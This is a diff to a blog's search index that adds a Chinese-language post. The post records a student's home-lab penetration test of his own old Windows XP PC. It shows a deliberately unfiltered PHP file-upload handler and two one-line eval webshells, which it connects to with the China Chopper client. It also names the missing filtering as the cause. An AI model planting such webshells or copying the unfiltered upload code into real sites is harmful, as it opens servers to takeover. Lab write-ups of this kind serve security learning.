@@ -1,6 +1,67 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>渗透测试实战--家用电脑</title>
+    <url>/2020/02/23/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E6%88%98-%E5%AE%B6%E7%94%A8%E7%94%B5%E8%84%91/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>​        因为疫情的影响导致现在还没有开学，在家里呆的有些无聊，最近也在学习渗透方面的知识，但是关于渗透测试，纸上得来终觉浅，绝知此事要躬行，还是要得累计实战经验，所以我就把目标转向了我家的家用台式电脑，就想搞一下。</p>
+<a id="more"></a>
+
+<h1 id="靶机环境"><a href="#靶机环境" class="headerlink" title="靶机环境"></a>靶机环境</h1><p>​        家用电脑比较老旧，是在我上初中的时候买的，甚至系统还是<strong>Windows xp</strong>，属于可以进博物馆的古董机，没办法，有靶机已经不错了，无论是虚拟机还是网上的靶场都感觉不得劲，还是物理机有搞头。</p>
+<p>​        我开始的时候是想用IIS建站的，但是中间有很多坑，这不算什么，<strong>一杯茶一包烟，一改配置坐一天</strong>，就当我觉得环境搭建成功的时候，我又发现了新的坑，一个是没有php环境，而且IIS支持asp，这也不算什么，但是又发现，开始的时候可以访问的资源莫名其妙的都无权访问了，网页报401，草(一种植物)，在尝试了网上很多方法了之后，我哭了，我放弃了，xp下的IIS服务的权限设置我搞不懂，还是我太弱了，我真是个垃圾(猛男哭泣)。</p>
+<p>​        我屈服了，我使用了phpstudy的傻瓜式操作建站，只能说真香，它是如此的便捷，如此的丝滑，我又一次哭了。</p>
+<p><img src="https://s2.ax1x.com/2020/02/23/31dxbR.png" alt="31dxbR.png"></p>
+<p>还是觉得老版本的phpstudy好用，关于phpstudy的安装和使用就不多说了，直接进入正题。</p>
+<p>首先，测试一下，查看一下靶机IP</p>
+<p><img src="https://s2.ax1x.com/2020/02/23/31SMLT.png" alt="31SMLT.png"></p>
+<p>发现是192.168.0.122</p>
+<p>在本机上测试ping一下</p>
+<p><img src="https://s2.ax1x.com/2020/02/23/31p9h9.png" alt="31p9h9.png"></p>
+<p>可以连上，在浏览器中查看</p>
+<p><img src="https://s2.ax1x.com/2020/02/23/31wssJ.png" alt="31wssJ.png"></p>
+<p>没问题，环境搭建好了，现在开始测试</p>
+<h1 id="建站"><a href="#建站" class="headerlink" title="建站"></a>建站</h1><p>先给靶机配上编辑器，要不用记事本写太变态了。这里我用的notepad++。</p>
+<p>这里我准备用上文件上传漏洞来上传一个webshell，用到菜刀连接获取靶机的权限。</p>
+<p>所以在靶机中写上一个具有文件上传功能的网页：</p>
+<p><img src="https://s2.ax1x.com/2020/02/23/31HMF0.png" alt="31HMF0.png"></p>
+<p>这里的HTML代码为：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>文件上传测试<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Type"</span> <span class="attr">content</span>=<span class="string">"text/html;charset=utf-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>请上传一个文件<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"upload_file.php"</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"file"</span>&gt;</span>filename:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"file"</span> <span class="attr">id</span>=<span class="string">"file"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"submit"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>php代码为：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> ($_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>] &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"error:"</span>.$_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>].<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"upload:"</span>.$_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>].<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"type:"</span>.$_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>].<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"size:"</span>.($_FILES[<span class="string">"file"</span>][<span class="string">"size"</span>] / <span class="number">1024</span>).<span class="string">"kb&lt;br&gt;"</span>;</span><br><span class="line">    move_uploaded_file($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>],<span class="string">"upload/"</span>.$_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"stored in:"</span>.<span class="string">"upload/"</span>.$_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>从php代码中可以看到没有对上传文件做任何的过滤，当然现实中这种是极少的，只有在靶机中才会出现。</p>
+<p>我这里上传了两个php文件，都是一句话木马，只是数据上传方式不同而已，一个是post，一个是get</p>
+<p><img src="https://s2.ax1x.com/2020/02/23/33FKKA.png" alt="33FKKA.png"></p>
+<p><img src="C:%5CUsers%5Clenovo111%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200223214732642.png" alt="image-20200223214732642"></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    @<span class="keyword">eval</span>($_POST[<span class="string">'cmd'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    @<span class="keyword">eval</span>($_GET[<span class="string">'cmd'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>@的作用是用来不显示报错的</p>
+<p><img src="https://s2.ax1x.com/2020/02/23/31b5U1.png" alt="31b5U1.png"></p>
+<p>这个是get类型的一句话木马</p>
+<p><img src="https://s2.ax1x.com/2020/02/23/33i9Tf.png" alt="33i9Tf.png"></p>
+<p>这个是post类型的一句话木马（图中用的是chrome的hackbar插件）</p>
+<p>这样就将一个webshell上传到了服务器了，我们用中国菜刀连接获得权限：</p>
+<p><img src="https://s2.ax1x.com/2020/02/23/33Ah4K.png" alt="33Ah4K.png"></p>
+<p>连接到了就拿取了靶机的shell</p>
+<p><img src="https://s2.ax1x.com/2020/02/23/33AXUP.png" alt="33AXUP.png"></p>
+<p>我们可以在靶机桌面上新建一个文件，写一句话</p>
+<p><img src="https://s2.ax1x.com/2020/02/23/33ZNBd.png" alt="33ZNBd.png"></p>
+<p><img src="https://s2.ax1x.com/2020/02/23/33VT0A.png" alt="33VT0A.png"></p>
+<p>这样我们可以看到靶机的桌面上就有了一个文本问价，里面就包含了这句话</p>
+<p><img src="https://s2.ax1x.com/2020/02/23/33ZI3T.png" alt="33ZI3T.png"></p>
+<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>​        这一次的渗透测试很简单，主要是尝试一些工具的使用和环境的配置以及网站的搭建（有点不成功的），也没有多少难度，最主要的是服务器后端php代码没有严格对上传文件的过滤检查，才是造成文件上传漏洞的成因，这一点是对网站搭建人员要注意和留心的，之后我会尝试写一些过滤方案，以及绕过的方法（因为没有绝对安全的系统）。</p>
+]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>文件上传漏洞</tag>
+        <tag>webshell</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>浏览器安全</title>
     <url>/2020/02/18/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8/</url>
     <content><![CDATA[<h1 id="浏览器安全"><a href="#浏览器安全" class="headerlink" title="浏览器安全"></a>浏览器安全</h1><p>​        浏览器的安全策略有很多，比如同源策略，csp，cookie设置，以及浏览器沙箱等，都是游览器安全策略的内容。本文用于记录和理解这些设施，随时扩充，不断学习。</p>
